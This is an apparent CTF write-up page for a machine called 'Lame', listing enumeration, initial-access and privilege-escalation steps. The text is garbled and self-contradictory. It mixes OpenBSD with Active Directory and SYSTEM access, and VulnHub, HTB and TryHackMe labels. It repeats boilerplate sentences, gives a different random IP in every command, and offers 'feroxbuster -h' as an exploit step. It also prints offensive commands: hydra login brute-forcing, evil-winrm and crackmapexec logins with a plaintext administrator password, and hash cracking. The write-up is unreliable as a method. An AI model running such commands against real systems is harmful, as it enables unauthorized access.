---
TitleSEO: "VulnHub — Lame (Medium OpenBSD) | ZureFX"
TitlePost: "VulnHub — Lame (Medium OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Lame. Resource-Based Constrained Delegation and Cron Job to achieve medium compromise on OpenBSD."
Keywords: "tryhackme, active directory, web"
URL: "https://zurefx.github.io/writeups/htb-lame-870.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-lame-870/"
Date: "2024-04-22"
Tags: "TryHackMe, Active Directory, Web"
Section: "writeups"
Lang: "en"
main_img: "htb-lame-870"
Permalink: "/writeups/htb-lame-870.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Lame** is rated **Medium** on VulnHub. It runs **OpenBSD** and the IP address during this analysis was `10.20.108.179`.

### Objectives

Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.25.6.27 -u administrator -p 'P@ssw0rd!' --shares
```

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities. The service account had excessive permissions assigned in Active Directory.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.16.151.235/FUZZ
gobuster dir -u http://10.103.222.98/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.12.97.65 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.10.77.32/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

### Web Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

```bash
gobuster dir -u http://10.95.202.125/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

The kernel version was outdated and vulnerable to a publicly known exploit. The database credentials were hardcoded in the application source code. The backup files contained sensitive information that should not have been accessible.

## Exploitation

### Vulnerability Identification

The kernel version was outdated and vulnerable to a publicly known exploit. Group Policy Preferences contained encrypted but recoverable credentials. Weak file permissions allowed modification of critical system files.

Key finding: **Resource-Based Constrained Delegation**.

The service was running without proper input validation, leading to injection vulnerabilities. The scheduled task ran with elevated privileges and could be abused for escalation.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.123.219.150 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.127.191.222 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.123.104.108 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The application stored sensitive credentials in an unencrypted configuration file. The target system was identified as running a vulnerable version of the service. Command injection was possible through unsanitized user input in the search functionality.

## Privilege Escalation

### Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions. Post-exploitation enumeration revealed a path to domain administrator privileges.

```powershell
evil-winrm -i 10.94.156.126 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.88.240.189 -u administrator -p 'P@ssw0rd!'
```

### Exploitation

Group Policy Preferences contained encrypted but recoverable credentials. The web application was vulnerable to Server-Side Template Injection (SSTI).

```powershell
feroxbuster -h
feroxbuster -h
nmap -sCV -p587,139,53 10.99.67.118 -oN scan.txt
feroxbuster -h
```

Privilege escalation was possible due to misconfigured sudo permissions. Privilege escalation was possible due to misconfigured sudo permissions.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Lateral movement was facilitated by reusing discovered credentials across services. Network traffic analysis revealed unencrypted communications containing user credentials.

## Summary

### Tools Used

- `rpcclient`
- `ldapsearch`
- `lookupsid`
- `evil-winrm`
- `john`
- `sqlmap`
- `atexec`
- `ligolo-ng`

### Key Takeaways

- Resource-Based Constrained Delegation
- Cron Job
- Open Redirect
- Broken Access Control
